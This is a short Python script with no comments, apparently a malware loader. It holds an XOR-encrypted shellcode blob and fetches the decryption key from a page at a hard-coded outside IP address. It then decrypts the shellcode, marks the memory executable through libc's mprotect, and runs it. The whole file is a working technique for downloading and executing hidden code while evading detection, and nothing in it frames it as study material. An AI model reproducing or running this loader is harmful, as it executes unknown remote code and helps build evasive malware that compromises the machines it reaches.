import requests
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
libc = CDLL('libc.so.6')


encrypted_shellcode = ("\x08\x09\x37\x09\xb3\x04\xbc\x74\x31\x25\x0e\x3a\xbe\xd7"
"\xab\xfa\xab\x1a\x1f\x3f\x06\x35\xbd\x67\x74\x04\x1f\x68\x6e\x70\x09\x6b\xed"
"\x80\x5c\x69\x68\x3f\xf9\x8f\x25\xbd\xb0\xe2\xb8\x87\x55\x02\xf9\xa1\xb2\x85"
"\x46\x71\xbd\xfa\xdc\x46\x2b\xa0\xe5\x80\x7f\x04\xa2\x08\xf1\x3a\x1a\x1f\x49"
"\x11\x00\x07\x40\x11\x5b\x5c\xb9\x8c\x27\xe1\x98\x2a\xec\x89\xfd\xef")
recovered_shellcode = ""

shellcode_length = len(encrypted_shellcode)
r = requests.get("http://91.142.94.70/3onai7qvht7tgt9O2gr0cuf16dqxTtft5trapa7p.html")
key = str(r.text)

for i in range(0,shellcode_length):
    y = ord(encrypted_shellcode[i]) ^ ord(key[i])
    recovered_shellcode += '%02x' %y

shellcode = recovered_shellcode.decode('hex')

sc = c_char_p(shellcode)
size = len(shellcode)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
